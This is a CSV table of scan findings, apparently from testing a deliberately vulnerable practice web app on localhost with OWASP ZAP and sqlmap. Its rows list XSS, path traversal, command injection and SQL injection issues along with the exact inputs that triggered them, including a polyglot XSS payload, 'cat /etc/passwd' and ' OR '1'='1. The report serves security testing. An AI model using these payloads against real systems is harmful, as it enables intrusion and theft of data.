APP,Vulnerability,Risk Level,File,Line,Input/Description,Tool,CVE/CWE
i2,XSS (DOM),High,vuln_wa/XSS/XSS_level1.php,Line 22,"username: jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e",OWASP ZAP,CWE-79: Improper Neutralization of Input During Web Page Generation
i2,XSS (Reflected),High,vuln_wa/FileInclusion/pages/lvl1.php,Line 26,URL: https://localhost/vuln_wa/FileInclusion/pages/lvl1.php?file=1.php?%3C/h5%3E%3CscrIpt%3Ealert(1);%3C/scRipt%3E%3Ch5%3E,OWASP ZAP,CWE-79: Improper Neutralization of Input During Web Page Generation
i2,XSS (Reflected),High,vuln_wa/FileInclusion/pages/lvl2.php,Line 33,URL: http://localhost/vuln_wa/FileInclusion/pages/lvl2.php?file=%3C%2Fh5%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch5%3E,OWASP ZAP,CWE-79: Improper Neutralization of Input During Web Page Generation
i2,XSS (Reflected),High,vuln_wa/XSS/XSS_level1.php,Line 22,username: <scrIpt>alert(1);</scRipt>,OWASP ZAP,CWE-79: Improper Neutralization of Input During Web Page Generation
i2,XSS (Reflected),High,vuln_wa/XSS/XSS_level3.php,Line 22,username: <img src=x onerror=prompt()>,OWASP ZAP,CWE-79: Improper Neutralization of Input During Web Page Generation
i2,Path Transversal,High,vuln_wa/FileInclusion/pages/lvl1.php,URL,https://localhost/vuln_wa/FileInclusion/pages/lvl1.php?file=/opt/lampp/etc/extra/httpd-xampp.conf,OWASP ZAP,CWE-22: Improper Limitation of a Pathname to a Restricted Directory
i2,Path Transversal,High,vuln_wa/FileInclusion/pages/lvl2.php,URL,https://localhost/vuln_wa/FileInclusion/pages/lvl2.php?file=/opt/lampp/etc/extra/httpd-xampp.conf,OWASP ZAP,CWE-22: Improper Limitation of a Pathname to a Restricted Directory
i2,Remote Comand Execution,High,vuln_wa/CommandExecution/CommandExec-1.php,Line 25,typeBox(Username): cat comex1/log1.txt,OWASP ZAP,CWE-78: Improper Neutralization of Special Elements used in an OS Command
i2,Remote Comand Execution,High,vuln_wa/CommandExecution/CommandExec-2.php,Line 25,typeBox(Name): cat CommandExec-2.php; Solution= typeBox(Name): Trochilidae,OWASP ZAP,CWE-78: Improper Neutralization of Special Elements used in an OS Command
i2,Remote Comand Execution,High,vuln_wa/CommandExecution/CommandExec-3.php,Line 39,typeBox(Name): ls,OWASP ZAP,CWE-78: Improper Neutralization of Special Elements used in an OS Command
i2,Remote Comand Execution,High,vuln_wa/CommandExecution/CommandExec-4.php,Line 44,typeBox(Name): cat /etc/passwd,OWASP ZAP,CWE-78: Improper Neutralization of Special Elements used in an OS Command
i2,SQL Injection,High,vuln_wa/SQL/sql1.php,Line 39,firstname: 1' OR '1'='1,"OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
i2,SQL Injection,High,vuln_wa/SQL/sql2.php,Line 37,"number: """" or 1=1; --","OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
i2,SQL Injection,High,vuln_wa/SQL/sql3.php,Line 38,number: ' OR '1'='1,"OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
i2,SQL Injection,High,vuln_wa/SQL/sql4.php,Line 42,number: 23 or 1=1; --,"OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
i2,SQL Injection,High,vuln_wa/SQL/sql5.php,Line 50,Erro no código sql5.php,"OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
i2,SQL Injection,High,vuln_wa/SQL/sql6.php,Line 35,number: ' OR '1'='1' -- ,"OWASP ZAP, sqlmap",CWE-89: Improper Neutralization of Special Elements used in an SQL Command
